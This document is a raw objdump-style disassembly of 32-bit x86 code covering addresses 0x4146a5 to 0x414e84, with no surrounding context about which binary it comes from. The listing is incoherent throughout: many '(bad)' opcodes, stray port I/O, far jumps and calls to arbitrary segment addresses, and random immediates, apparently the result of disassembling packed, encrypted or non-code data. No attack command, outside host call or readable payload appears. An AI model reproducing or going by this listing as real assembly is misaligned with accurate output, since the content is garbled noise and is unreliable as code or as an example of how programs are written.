  4146a5:	sbb    DWORD PTR [ebx-0x66090abb],eax
  4146ab:	int3   
  4146ac:	xchg   esi,eax
  4146ad:	popf   
  4146ae:	push   es
  4146af:	push   eax
  4146b0:	inc    esi
  4146b1:	loope  0x4146e2
  4146b3:	dec    ebx
  4146b4:	dec    eax
  4146b5:	add    bl,dh
  4146b7:	rcr    BYTE PTR [eax+0x2e04c80a],0xd8
  4146be:	xor    BYTE PTR fs:[ecx+0xe],ah
  4146c2:	pop    edx
  4146c3:	(bad)  
  4146c4:	cmp    eax,esi
  4146c6:	ror    BYTE PTR [edi+0x8f4bef],1
  4146cc:	cmp    ebx,DWORD PTR [eax+0x77]
  4146cf:	std    
  4146d0:	(bad)  
  4146d1:	(bad)  
  4146d2:	jp     0x414681
  4146d4:	nop
  4146d5:	mov    edi,0xe605d108
  4146da:	cmp    DWORD PTR [ebx],esi
  4146dc:	jmp    0x4c4f:0x51f7e687
  4146e3:	add    eax,0x25bec20e
  4146e8:	ror    BYTE PTR [ecx],1
  4146ea:	adc    DWORD PTR gs:[ecx],0xd9d7b702
  4146f1:	sti    
  4146f2:	mov    ds:0xa749451a,eax
  4146f7:	pop    DWORD PTR [edi]
  4146f9:	out    dx,al
  4146fa:	shl    DWORD PTR [ebp-0x9fa49cb],0xed
  414701:	add    edi,eax
  414703:	inc    eax
  414704:	mov    bh,BYTE PTR [eax-0x9]
  414707:	jo     0x4146e7
  414709:	cmc    
  41470a:	stc    
  41470b:	inc    edi
  41470c:	int    0xa1
  41470e:	shl    BYTE PTR [esi-0x2fe1379f],cl
  414714:	pop    edi
  414715:	jns    0x4146ed
  414717:	xlat   BYTE PTR ds:[ebx]
  414718:	iret   
  414719:	repnz aas 
  41471b:	gs je  0x414798
  41471e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41471f:	std    
  414720:	push   es
  414721:	arpl   WORD PTR [ebp-0x59],bx
  414724:	xchg   ecx,eax
  414725:	pusha  
  414726:	cmp    esp,ebp
  414728:	cmp    DWORD PTR [edx+0x4f],edx
  41472b:	sbb    eax,0x7427d78a
  414730:	mov    dl,0xba
  414732:	sbb    ebx,DWORD PTR [esi+0x703957d7]
  414738:	lea    ecx,[ecx+0x14743f60]
  41473e:	xchg   ebp,eax
  41473f:	out    dx,al
  414740:	and    BYTE PTR [ebx],0x99
  414743:	aad    0xa2
  414745:	popa   
  414746:	fwait
  414747:	cmp    al,0xc3
  414749:	es mov edi,0x203caa5a
  41474f:	ret    0xfd52
  414752:	std    
  414753:	dec    esp
  414754:	in     al,dx
  414755:	sbb    al,0xee
  414757:	stc    
  414758:	je     0x4147b0
  41475a:	sahf   
  41475b:	adc    DWORD PTR [edi],edx
  41475d:	aas    
  41475e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41475f:	mov    edi,0xb901003b
  414764:	mov    edi,0x3a118d0f
  414769:	lahf   
  41476a:	call   0x6225620e
  41476f:	mov    bh,0xc7
  414771:	shl    ebx,1
  414773:	or     dl,BYTE PTR [edx]
  414775:	jg     0x4147d7
  414777:	pop    edi
  414778:	jmp    0x6f17:0x5617f7ef
  41477f:	arpl   si,cx
  414781:	enter  0x3e00,0x1c
  414785:	pop    edx
  414786:	sub    eax,0xdb93fa50
  41478b:	and    BYTE PTR [esp+eax*8],cl
  41478e:	test   al,0x92
  414790:	adc    al,0x9d
  414792:	pop    esi
  414793:	loope  0x414794
  414795:	or     eax,DWORD PTR ds:0xef2fcd7a
  41479b:	push   edi
  41479c:	lea    ecx,ds:[esp+eiz*4+0x66f73924]
  4147a4:	cli    
  4147a5:	adc    BYTE PTR [esi+0x78efec0f],ah
  4147ab:	les    esi,FWORD PTR [edi]
  4147ad:	sub    BYTE PTR [ecx+0x3a],0xf3
  4147b1:	mov    ch,0x5e
  4147b3:	sub    ecx,DWORD PTR [edi]
  4147b5:	inc    edi
  4147b6:	fwait
  4147b7:	(bad)  
  4147b8:	jmp    0x414756
  4147ba:	add    ebx,esi
  4147bc:	cmc    
  4147bd:	dec    esi
  4147be:	mov    bh,0xcb
  4147c0:	add    ebx,DWORD PTR [edx-0x4ee0f9a1]
  4147c6:	xchg   DWORD PTR [esi],edi
  4147c8:	fild   DWORD PTR [eax]
  4147ca:	rol    BYTE PTR [esi-0x1b6c6921],1
  4147d0:	inc    esp
  4147d1:	fisub  DWORD PTR [esi]
  4147d3:	stos   BYTE PTR es:[edi],al
  4147d4:	cdq    
  4147d5:	fild   WORD PTR [ebx+ebx*1+0x7b]
  4147d9:	inc    edx
  4147da:	dec    esp
  4147db:	jmp    0xcc34:0xec60b6a6
  4147e2:	and    ebp,ebx
  4147e4:	test   eax,0xf5a923db
  4147e9:	pusha  
  4147ea:	push   ecx
  4147eb:	jnp    0x41486b
  4147ed:	mov    ss,WORD PTR [edi-0x35b3aee7]
  4147f3:	mov    eax,0x9eae16f2
  4147f8:	(bad)
  4147fc:	dec    edx
  4147fd:	mov    al,ds:0xfbf14460
  414802:	and    eax,0x8e50ab12
  414807:	add    bh,BYTE PTR [edi-0x64]
  41480a:	inc    eax
  41480b:	sub    eax,0x42414359
  414810:	xchg   esi,eax
  414811:	mov    esi,0x4c5aa3b4
  414816:	fmul   st(3),st
  414818:	cmp    ch,BYTE PTR [edi-0x66]
  41481b:	mov    eax,ds:0xeaa34e0e
  414820:	test   BYTE PTR ds:0x57051968,bh
  414826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414827:	xchg   esp,eax
  414828:	adc    al,bh
  41482a:	ja     0x414859
  41482c:	and    al,0xf4
  41482e:	pop    eax
  41482f:	stos   DWORD PTR es:[edi],eax
  414830:	test   BYTE PTR [esi-0x29ca649c],0xff
  414837:	scas   al,BYTE PTR es:[edi]
  414838:	clc    
  414839:	or     ch,dh
  41483b:	xchg   dl,cl
  41483d:	leave  
  41483e:	xor    eax,0x61668bc6
  414843:	mov    dl,0x5d
  414845:	dec    ecx
  414846:	test   BYTE PTR [esp+eiz*4+0xd],ah
  41484a:	mov    ecx,0x6cbaf89a
  41484f:	retf   
  414850:	mov    gs,WORD PTR [ecx-0x20]
  414853:	pushf  
  414854:	into   
  414855:	call   0x55cc851e
  41485a:	jbe    0x41489d
  41485c:	push   0x48acff60
  414861:	xor    al,0x3b
  414863:	scas   al,BYTE PTR es:[edi]
  414864:	shr    DWORD PTR [ebx-0x60],0x4f
  414868:	imul   edi,DWORD PTR [eax-0x75],0x55
  41486c:	push   ebx
  41486d:	sbb    ch,BYTE PTR [ecx+0x1e]
  414870:	pop    edx
  414871:	jl     0x414879
  414873:	(bad)  
  414874:	ja     0x4148c7
  414876:	jno    0x41489b
  414878:	pushf  
  414879:	lods   al,BYTE PTR cs:[esi]
  41487b:	pop    edi
  41487c:	pop    ds
  41487d:	or     dh,BYTE PTR [esi-0x335d8cea]
  414883:	jmp    0x414839
  414885:	out    0x9c,al
  414887:	xlat   BYTE PTR ds:[ebx]
  414888:	and    DWORD PTR [esi+0x6b],edx
  41488b:	ret    
  41488c:	stos   BYTE PTR es:[edi],al
  41488d:	mov    ch,0x7d
  41488f:	push   0xfffffff7
  414891:	pop    ss
  414892:	in     eax,dx
  414893:	(bad)  
  414896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414897:	xchg   DWORD PTR [esi+eax*8+0x4fab6f0a],esp
  41489e:	pop    ebx
  41489f:	jmp    0xc545:0xd7cd8f65
  4148a6:	popa   
  4148a7:	jge    0x4148d9
  4148a9:	std    
  4148aa:	sub    eax,0xa652c891
  4148af:	bnd jmp 0x41488c
  4148b2:	mov    DWORD PTR [edx-0x3ebf4438],ebx
  4148b8:	inc    ecx
  4148b9:	loope  0x414914
  4148bb:	sub    esi,DWORD PTR [edx]
  4148bd:	(bad)  
  4148be:	add    BYTE PTR [edx+0x385575ad],cl
  4148c4:	shr    BYTE PTR [ecx-0x498a8b70],1
  4148ca:	aam    0x43
  4148cc:	add    eax,0xe30b99bc
  4148d1:	adc    al,0xe6
  4148d3:	mov    bl,0x85
  4148d5:	and    eax,0xa6a8ecf2
  4148da:	mov    al,ds:0x134fe72b
  4148df:	xchg   DWORD PTR [esi],ebx
  4148e1:	dec    ebx
  4148e2:	or     cl,BYTE PTR [eax+0x181761cf]
  4148e8:	popf   
  4148e9:	call   0x893561d9
  4148ee:	push   ds
  4148ef:	sub    dl,BYTE PTR [esi+0x3b]
  4148f2:	pop    ecx
  4148f3:	fiadd  DWORD PTR [edx+0x50d277cc]
  4148f9:	iret   
  4148fa:	stc    
  4148fb:	mov    ds:0x62630030,eax
  414900:	mov    ds:0x36b750db,al
  414905:	repnz scas al,BYTE PTR es:[edi]
  414907:	sahf   
  414908:	cld    
  414909:	shr    DWORD PTR [esi],0xdd
  41490c:	inc    esi
  41490d:	pop    ecx
  41490e:	fwait
  41490f:	stos   BYTE PTR es:[edi],al
  414910:	jae    0x41496c
  414912:	mov    eax,ds:0x61673af2
  414917:	mov    esi,0xb66465d0
  41491c:	std    
  41491d:	jae    0x414912
  41491f:	xor    eax,0x1f183c38
  414924:	mov    ebx,0xaeb273e9
  414929:	sbb    eax,0x8ed69dc0
  41492e:	and    ch,BYTE PTR [eax+esi*4-0x6633a059]
  414935:	add    bh,ch
  414937:	cmp    bh,ch
  414939:	pop    ss
  41493a:	xor    al,0x90
  41493c:	stc    
  41493d:	jne    0x414960
  41493f:	adc    BYTE PTR ds:0x93458f7f,bh
  414945:	test   BYTE PTR [esi],bl
  414947:	sbb    DWORD PTR [eax],ebp
  414949:	neg    DWORD PTR [ecx]
  41494b:	call   0xbb10:0x63182d5d
  414952:	pusha  
  414953:	lea    esi,[ebp-0xc]
  414956:	xchg   ebp,eax
  414957:	cs dec eax
  414959:	mov    edx,0x6379a38b
  41495e:	out    dx,al
  41495f:	repz loope 0x414990
  414962:	adc    DWORD PTR [esi+0xc],edx
  414965:	and    DWORD PTR [eax-0x58],0xffffffff
  414969:	jmp    0x76f0:0x1ac13f9d
  414970:	inc    esp
  414971:	pop    ebp
  414972:	and    BYTE PTR [ebp-0x5023d16a],dh
  414978:	retf   0x10c4
  41497b:	inc    esi
  41497c:	ror    edi,0xa9
  41497f:	mov    edx,0x66d23b71
  414984:	dec    ecx
  414985:	ins    DWORD PTR es:[edi],dx
  414986:	and    eax,0x54809f2d
  41498b:	xchg   ecx,eax
  41498c:	push   ebx
  41498d:	cmp    esi,ebp
  41498f:	jg     0x4149b3
  414991:	mov    bh,0xe6
  414993:	jmp    0x8fc4:0x591fe25c
  41499a:	inc    DWORD PTR [esi-0x754efb0c]
  4149a0:	daa    
  4149a1:	(bad)  
  4149a2:	jle    0x4149bd
  4149a4:	dec    ecx
  4149a5:	aaa    
  4149a6:	jae    0x4149c5
  4149a8:	inc    edi
  4149a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149aa:	call   0x4c92b77b
  4149af:	mov    dl,0x65
  4149b1:	inc    edx
  4149b2:	std    
  4149b3:	push   edx
  4149b4:	cli    
  4149b5:	sar    DWORD PTR ss:[esi+0x3a838520],0xa3
  4149bd:	jle    0x414a37
  4149bf:	xor    bh,dh
  4149c1:	and    al,0x11
  4149c3:	cli    
  4149c4:	add    esi,ecx
  4149c6:	push   es
  4149c7:	pop    ebp
  4149c8:	xor    eax,eax
  4149ca:	mov    ds:0x5e9845e2,al
  4149cf:	fsubr  QWORD PTR [edx+eiz*2-0x3c]
  4149d3:	pcmpgtd mm6,QWORD PTR [edx+0x6f]
  4149d7:	inc    edx
  4149d8:	ror    BYTE PTR [ecx],cl
  4149da:	jecxz  0x4149ca
  4149dc:	sahf   
  4149dd:	add    al,0xfb
  4149df:	pop    es
  4149e0:	jmp    0x4149d0
  4149e2:	push   ecx
  4149e3:	adc    BYTE PTR [edx+0x6],ch
  4149e6:	sub    BYTE PTR ds:0xd386403c,cl
  4149ec:	adc    BYTE PTR [edi-0x495a9f7e],0x3a
  4149f3:	xor    edx,DWORD PTR [edx-0x77]
  4149f6:	mov    BYTE PTR [ecx+0x613ad3c4],bh
  4149fc:	push   ecx
  4149fd:	xor    eax,0x81c58724
  414a02:	(bad)  
  414a03:	iret   
  414a04:	(bad)  
  414a05:	and    esp,eax
  414a07:	pop    ss
  414a08:	xor    ah,BYTE PTR [ebp-0x1]
  414a0b:	call   0x3b1e:0xe60e2f63
  414a12:	mov    cl,0x58
  414a14:	sbb    BYTE PTR [ebx+0x53],ch
  414a17:	jno    0x414a75
  414a19:	jp     0x4149f6
  414a1b:	and    BYTE PTR [edi],dl
  414a1d:	mov    dl,0x8c
  414a1f:	fbld   TBYTE PTR [eax+0x339a04d1]
  414a25:	pushf  
  414a26:	mov    ch,0xd4
  414a28:	cmp    BYTE PTR [ecx+0x735215de],bl
  414a2e:	imul   ebp,DWORD PTR [edx+0x44e0d874],0x9766f141
  414a38:	or     esp,DWORD PTR [edx-0x6f9face5]
  414a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a3f:	adc    DWORD PTR [esi],esp
  414a41:	sub    eax,0xf772d20a
  414a46:	mov    dl,0xc0
  414a48:	mov    ecx,0x8690c837
  414a4d:	pop    edi
  414a4e:	jle    0x414a95
  414a50:	sub    al,BYTE PTR [ebx+0x3f]
  414a53:	mov    ebx,0x10a592f9
  414a58:	pop    ecx
  414a59:	fdivr  QWORD PTR [ebx-0x62]
  414a5c:	lds    esi,FWORD PTR [ecx+0x6f4cd9e4]
  414a62:	adc    al,0x46
  414a64:	sahf   
  414a65:	mov    ds:0x762490e7,al
  414a6a:	(bad)  
  414a6b:	mov    cl,0x8a
  414a6d:	lods   eax,DWORD PTR ds:[esi]
  414a6e:	out    0x19,al
  414a70:	adc    BYTE PTR [esi-0x29],dh
  414a73:	push   ebp
  414a74:	xor    BYTE PTR [esi-0x1d],bl
  414a77:	add    DWORD PTR [edx],0x75
  414a7a:	mov    esp,0x837bded1
  414a7f:	dec    ecx
  414a80:	and    dl,BYTE PTR [ebx+0x644a29ad]
  414a86:	inc    ecx
  414a87:	rcl    cl,cl
  414a89:	add    DWORD PTR [ecx],ebp
  414a8b:	icebp  
  414a8c:	ja     0x414b0a
  414a8e:	dec    esi
  414a8f:	xlat   BYTE PTR ds:[ebx]
  414a90:	push   es
  414a91:	(bad)  
  414a92:	xlat   BYTE PTR ds:[ebx]
  414a93:	push   ebx
  414a94:	jge    0x414a9b
  414a96:	js     0x414a84
  414a98:	icebp  
  414a99:	ins    BYTE PTR es:[edi],dx
  414a9a:	jmp    0x910f6e43
  414a9f:	out    0x46,al
  414aa1:	hlt    
  414aa2:	cmc    
  414aa3:	or     al,0xf1
  414aa5:	stos   BYTE PTR es:[edi],al
  414aa6:	pop    edi
  414aa7:	mov    eax,DWORD PTR [esi-0x3c]
  414aaa:	ds jne 0x414b1d
  414aad:	jae    0x414a88
  414aaf:	into   
  414ab0:	inc    eax
  414ab1:	dec    ecx
  414ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ab3:	fwait
  414ab4:	push   es
  414ab5:	(bad)  
  414ab6:	sbb    BYTE PTR [edi+0x2f],bl
  414ab9:	call   0x97bf:0x6923061
  414ac0:	hlt    
  414ac1:	jmp    0x5885:0x7c69584b
  414ac8:	imul   edx,DWORD PTR [ecx+ebp*8],0xffffffe8
  414acc:	stos   BYTE PTR es:[edi],al
  414acd:	and    cl,dl
  414acf:	in     eax,dx
  414ad0:	ror    BYTE PTR [eax],1
  414ad2:	loop   0x414ae8
  414ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ad5:	aad    0x9d
  414ad7:	(bad)  
  414ad8:	ins    BYTE PTR es:[edi],dx
  414ad9:	dec    ebx
  414ada:	cmovne ebx,DWORD PTR [edx]
  414add:	mov    esp,0xf88c4ca4
  414ae2:	imul   edi,DWORD PTR [edx+ebp*8-0x46b9c437],0xffffffe2
  414aea:	xchg   esi,eax
  414aeb:	scas   eax,DWORD PTR es:[edi]
  414aec:	xor    eax,0x600712ca
  414af1:	fdivp  st(5),st
  414af3:	xchg   ebp,eax
  414af4:	sbb    al,0x71
  414af6:	hlt    
  414af7:	setp   ch
  414afa:	xchg   ebx,eax
  414afb:	test   al,0x74
  414afd:	cmp    dh,BYTE PTR ds:0xcbf75c74
  414b03:	shr    DWORD PTR [ecx+0x1d5d7dd6],cl
  414b09:	repz enter 0x8d0e,0xb5
  414b0e:	mov    cl,0xbe
  414b10:	in     eax,0x69
  414b12:	dec    esi
  414b13:	sahf   
  414b14:	push   eax
  414b15:	inc    esi
  414b16:	mov    ds:0xc1747544,al
  414b1b:	daa    
  414b1c:	into   
  414b1d:	sti    
  414b1e:	aam    0x4b
  414b20:	fxch   st(1)
  414b22:	mov    eax,ds:0x777d9e98
  414b27:	in     al,dx
  414b28:	fmul   DWORD PTR [ebx+0x2883d821]
  414b2e:	or     DWORD PTR [ebp+0x69],edx
  414b31:	aas    
  414b32:	xchg   edi,eax
  414b33:	sbb    esp,esp
  414b35:	sub    eax,DWORD PTR [edi]
  414b37:	or     ecx,edi
  414b39:	pop    ebp
  414b3a:	push   ds
  414b3b:	daa    
  414b3c:	pushf  
  414b3d:	mov    esi,DWORD PTR [ebx+0x17]
  414b40:	loopne 0x414b07
  414b42:	inc    esi
  414b43:	add    BYTE PTR [esi+0x34635052],0x9
  414b4a:	or     dl,al
  414b4c:	push   esi
  414b4d:	inc    edx
  414b4e:	mov    edx,0xc3bee018
  414b53:	jle    0x414b5b
  414b55:	sbb    al,0xb8
  414b57:	and    DWORD PTR [eax+0x4e],esi
  414b5a:	js     0x414b10
  414b5c:	(bad)  [esi]
  414b5e:	(bad)  
  414b5f:	fisttp WORD PTR [esp+eax*2+0x5a1fcfe0]
  414b66:	arpl   WORD PTR [ecx+0x61],bx
  414b69:	retf   
  414b6a:	mov    edx,edx
  414b6c:	pushf  
  414b6d:	mov    ch,0xd5
  414b6f:	ret    0x96b2
  414b72:	popf   
  414b73:	ins    BYTE PTR es:[edi],dx
  414b74:	pop    edx
  414b75:	call   0x48f55538
  414b7a:	and    eax,0x9d586c3
  414b7f:	adc    eax,0x1919333c
  414b84:	out    dx,eax
  414b85:	adc    BYTE PTR [esi+ebx*4-0x3ccb816c],al
  414b8c:	mov    dl,0x35
  414b8e:	xchg   edx,eax
  414b8f:	jmp    0xc4af:0xe1d71967
  414b96:	mov    ebx,edx
  414b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b99:	sahf   
  414b9a:	pop    ds
  414b9b:	pop    esi
  414b9c:	dec    ecx
  414b9d:	mov    ds:0xf2fd5baf,eax
  414ba2:	loop   0x414be5
  414ba4:	dec    esi
  414ba5:	push   cs
  414ba6:	fsub   DWORD PTR [ecx+ebx*8+0x5e6e1839]
  414bad:	inc    ebx
  414bae:	loop   0x414bb1
  414bb0:	pop    ebx
  414bb1:	adc    esp,edx
  414bb3:	fldcw  WORD PTR [ecx]
  414bb5:	(bad)  
  414bb6:	out    dx,eax
  414bb7:	and    eax,0xb0ecc2fa
  414bbc:	iret   
  414bbd:	pop    eax
  414bbe:	xchg   ecx,eax
  414bbf:	sbb    eax,DWORD PTR [eax-0x46]
  414bc2:	outs   dx,BYTE PTR ds:[esi]
  414bc3:	jecxz  0x414c2b
  414bc5:	mov    dl,0x81
  414bc7:	out    0x8f,al
  414bc9:	cli    
  414bca:	mov    ebx,0x98968e82
  414bcf:	or     DWORD PTR [edx],esp
  414bd1:	push   es
  414bd2:	adc    edi,DWORD PTR [edi]
  414bd4:	mov    cl,0xf7
  414bd6:	dec    ebp
  414bd7:	lds    ebx,FWORD PTR [edi+0x18]
  414bda:	std    
  414bdb:	mov    eax,fs
  414bdd:	cdq    
  414bde:	or     DWORD PTR [eax+0x3d],ebp
  414be1:	push   ds
  414be2:	sub    esp,DWORD PTR [esp+edi*2]
  414be5:	int3   
  414be6:	adc    DWORD PTR [ebp-0x3a6ae548],esi
  414bec:	int    0xe0
  414bee:	mov    BYTE PTR [edx+0x61],bh
  414bf1:	xor    eax,0xa8f485bd
  414bf6:	imul   ecx,DWORD PTR [ebx+0x52],0x4e
  414bfa:	sbb    bh,0xc7
  414bfd:	outs   dx,BYTE PTR ds:[esi]
  414bfe:	bound  eax,QWORD PTR [esi+0x7f2f197]
  414c04:	mov    BYTE PTR [edx],al
  414c06:	cmp    DWORD PTR [eax-0x7ed956d5],0x61226439
  414c10:	test   al,0xa7
  414c12:	push   es
  414c13:	mov    bh,BYTE PTR [ebp+0x3f]
  414c16:	add    ch,BYTE PTR ds:0xbc308db0
  414c1c:	jp     0x414c92
  414c1e:	xchg   esp,eax
  414c1f:	shr    BYTE PTR [eax-0x6c],cl
  414c22:	cmp    DWORD PTR [ebx-0x66],ebx
  414c25:	jns    0x414c9a
  414c27:	cwde   
  414c28:	cmp    BYTE PTR [ebx-0x3e],bh
  414c2b:	imul   ebp,DWORD PTR [ebx+0x63],0xffffffcc
  414c2f:	cmp    ebx,DWORD PTR [eax+0x2114c2ff]
  414c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c36:	push   ds
  414c37:	mov    ebp,0x45a9f0ff
  414c3c:	sub    DWORD PTR [ecx+0x5e705025],0x656d02b6
  414c46:	arpl   dx,ax
  414c48:	mov    ds:0x53dda077,al
  414c4d:	mov    ebx,0x5143edb2
  414c52:	stc    
  414c53:	add    eax,0x79391df1
  414c58:	outs   dx,BYTE PTR ds:[esi]
  414c59:	inc    eax
  414c5a:	jecxz  0x414cbe
  414c5c:	mov    ds:0xa3c28df2,eax
  414c61:	add    BYTE PTR [edi],bh
  414c63:	add    bh,BYTE PTR [ecx]
  414c65:	inc    esp
  414c66:	sbb    al,0xbf
  414c68:	fs push edx
  414c6a:	ret    
  414c6b:	push   esp
  414c6c:	fimul  DWORD PTR [ebp+eiz*4-0x65e278ae]
  414c73:	mov    esi,0x8593d886
  414c78:	inc    eax
  414c79:	mov    ah,0xc
  414c7b:	pushf  
  414c7c:	scas   al,BYTE PTR es:[edi]
  414c7d:	lea    eax,[ebp-0x2d97b25c]
  414c83:	retf   0x324e
  414c86:	xor    DWORD PTR [ebp-0x226c0bec],edi
  414c8c:	mov    esi,0xd390366a
  414c91:	mov    bl,0x68
  414c93:	in     eax,dx
  414c94:	int    0xd
  414c96:	cli    
  414c97:	jb     0x414c30
  414c99:	pop    ebp
  414c9a:	ror    bl,0x4f
  414c9d:	jg     0x414cc7
  414c9f:	popa   
  414ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ca1:	test   DWORD PTR [edx+0x18],ecx
  414ca4:	aas    
  414ca5:	lods   al,BYTE PTR ds:[esi]
  414ca6:	and    BYTE PTR [esp+edi*4-0x7cfa659d],dl
  414cad:	xor    BYTE PTR [eax],bh
  414caf:	cmp    BYTE PTR [eax+ebp*4+0x51ddac56],ah
  414cb6:	dec    ecx
  414cb7:	jmp    0xf27e:0x189fd773
  414cbe:	scas   eax,DWORD PTR es:[edi]
  414cbf:	pop    eax
  414cc0:	dec    esi
  414cc1:	ins    DWORD PTR es:[edi],dx
  414cc2:	out    0x78,al
  414cc4:	test   BYTE PTR [esi],bh
  414cc6:	mov    ds,WORD PTR [ecx-0x685722ac]
  414ccc:	push   0xffffff80
  414cce:	je     0x414cc9
  414cd0:	jmp    0x79b2:0x6be440fc
  414cd7:	div    BYTE PTR [ecx+0x14a92e8b]
  414cdd:	mov    ch,BYTE PTR [eax]
  414cdf:	cmc    
  414ce0:	adc    DWORD PTR [edx-0x66],esi
  414ce3:	xchg   esi,eax
  414ce4:	imul   ecx,ebp,0xdf2f1d66
  414cea:	arpl   bx,cx
  414cec:	ret    0x43cf
  414cef:	int3   
  414cf0:	xor    eax,ebp
  414cf2:	jno    0x414c9f
  414cf4:	inc    ecx
  414cf5:	adc    eax,ecx
  414cf7:	dec    ebx
  414cf8:	pushf  
  414cf9:	es mov dh,0x95
  414cfc:	shl    dl,1
  414cfe:	mov    ah,0x96
  414d00:	sti    
  414d01:	(bad)  
  414d02:	xor    BYTE PTR ss:[ebp-0x79d53225],ch
  414d09:	ror    DWORD PTR [ebx+0x7a5d0e1],cl
  414d0f:	xor    eax,0xad71f231
  414d14:	xor    bh,BYTE PTR [edx]
  414d16:	adc    dl,BYTE PTR [ebx+0x5b]
  414d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d1a:	sbb    al,0x6f
  414d1c:	push   esp
  414d1d:	das    
  414d1e:	push   edx
  414d1f:	ror    dl,cl
  414d21:	addr16 push 0xcbc483a4
  414d27:	outs   dx,DWORD PTR ds:[esi]
  414d28:	retf   
  414d29:	aas    
  414d2a:	rcr    DWORD PTR [eax+0x37],cl
  414d2d:	ins    BYTE PTR es:[edi],dx
  414d2e:	nop
  414d2f:	adc    edx,esp
  414d31:	jle    0x414d6e
  414d33:	push   0xa
  414d35:	inc    BYTE PTR [edx+0xd]
  414d38:	push   ebp
  414d39:	mov    esi,0x2be892ce
  414d3e:	repz cmp BYTE PTR [eax-0x63],al
  414d42:	push   eax
  414d43:	sar    al,cl
  414d45:	mov    ah,0x38
  414d47:	mov    eax,ds:0x9ba20704
  414d4c:	mov    esp,0x80c09e42
  414d51:	sbb    ebp,esp
  414d53:	sti    
  414d54:	jns    0x414d72
  414d56:	sbb    ah,BYTE PTR [ebp-0x3df86455]
  414d5c:	sub    al,0x4f
  414d5e:	repnz mov ch,0xf3
  414d61:	mov    dl,0xc6
  414d63:	xchg   DWORD PTR [ebx+edi*1+0x7],ebx
  414d67:	sbb    BYTE PTR [ecx-0x68],dl
  414d6a:	jb     0x414dd4
  414d6c:	push   0xffffff9e
  414d6e:	sbb    ebx,0xffffffa3
  414d71:	dec    edx
  414d72:	cmp    bl,BYTE PTR [esi+0x5d]
  414d75:	test   BYTE PTR [eax-0x1493cbd],dl
  414d7b:	cmp    DWORD PTR [eax],ebx
  414d7d:	xchg   esp,eax
  414d7e:	mov    al,ds:0x45e033bd
  414d83:	push   esi
  414d84:	popa   
  414d85:	push   ebx
  414d86:	add    dh,BYTE PTR [edx+0x14]
  414d89:	jae    0x414d0d
  414d8b:	mov    DWORD PTR [eax+0x67],ebp
  414d8e:	pop    edx
  414d8f:	push   ds
  414d90:	add    eax,0x8a89a795
  414d95:	pop    es
  414d96:	pop    edi
  414d97:	inc    esp
  414d98:	mov    edi,0x7bba0975
  414d9d:	push   edi
  414d9e:	sbb    al,0x3b
  414da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414da1:	cli    
  414da2:	sbb    BYTE PTR [edi+ebx*4],al
  414da5:	sub    eax,0xec932d7b
  414daa:	mov    cl,bl
  414dac:	sub    dh,BYTE PTR [esi]
  414dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414daf:	stos   DWORD PTR es:[edi],eax
  414db0:	outs   dx,BYTE PTR ds:[esi]
  414db1:	fadd   QWORD PTR [esi]
  414db3:	ja     0x414df9
  414db5:	xor    eax,0x563449f4
  414dba:	lock xor esi,DWORD PTR [ecx+0x78]
  414dbe:	rcl    BYTE PTR [ebx+0x6826bbf8],0xb9
  414dc5:	cwde   
  414dc6:	add    BYTE PTR [edi-0x58bf5417],cl
  414dcc:	dec    edx
  414dcd:	sbb    ch,bh
  414dcf:	push   eax
  414dd0:	add    DWORD PTR [ebx+ebp*8],0xe794e577
  414dd7:	lods   eax,DWORD PTR ds:[esi]
  414dd8:	pop    eax
  414dd9:	call   0x981d:0x7643a0fe
  414de0:	shr    DWORD PTR [ebx+0x28b43a24],cl
  414de6:	push   esp
  414de7:	(bad)  
  414de8:	mov    edx,0xc586c863
  414ded:	adc    dh,al
  414def:	mov    ecx,0x6b2bcf55
  414df4:	loopne 0x414de4
  414df6:	jg     0x414da9
  414df8:	data16 fcom DWORD PTR [ebx-0x6a8b1ca]
  414dff:	push   sp
  414e01:	mov    edx,0x9bcd521e
  414e06:	sbb    eax,0xab8a6a92
  414e0b:	imul   edi,DWORD PTR [ecx-0x4cbafbe8],0x46
  414e12:	inc    ebx
  414e13:	ret    
  414e14:	add    cl,BYTE PTR [esi+esi*4]
  414e17:	or     eax,0x292f119b
  414e1c:	jne    0x414e36
  414e1e:	sbb    esi,edx
  414e20:	and    DWORD PTR [eax],ebx
  414e22:	xor    esi,DWORD PTR [edx]
  414e24:	mov    ch,0xa1
  414e26:	into   
  414e27:	sar    DWORD PTR [ecx],0x2c
  414e2a:	out    dx,al
  414e2b:	or     BYTE PTR [ebx+0x6706281],bh
  414e31:	cs stos DWORD PTR es:[edi],eax
  414e33:	sub    dh,ah
  414e35:	not    DWORD PTR [edx]
  414e37:	sbb    esi,DWORD PTR [edx]
  414e39:	jbe    0x414e77
  414e3b:	pop    ebp
  414e3c:	and    BYTE PTR [esi-0x23],0x8e
  414e40:	stos   DWORD PTR es:[edi],eax
  414e41:	mov    edx,0x3fe18bc0
  414e46:	mov    ebx,0x2396636d
  414e4b:	out    dx,eax
  414e4c:	loope  0x414e49
  414e4e:	dec    edx
  414e4f:	inc    esi
  414e50:	jbe    0x414ed0
  414e52:	xchg   esp,eax
  414e53:	(bad)
  414e57:	fsub   st,st(7)
  414e59:	mov    DWORD PTR [ebp+0x12],ecx
  414e5c:	data16 mov al,0xcb
  414e5f:	and    DWORD PTR [ebp+0x76],0x38012dbd
  414e66:	xor    al,0x2f
  414e68:	jge    0x414ee2
  414e6a:	sub    eax,0x4a010534
  414e6f:	mov    ch,0x8
  414e71:	mov    ecx,0x669e15e7
  414e76:	jp     0x414e01
  414e78:	mov    dh,0xc3
  414e7a:	aad    0xb7
  414e7c:	push   es
  414e7d:	dec    edi
  414e7e:	sti    
  414e7f:	mov    al,ds:0x4694a2d5
  414e84:	mov    ecx,0x6ec0c4e8
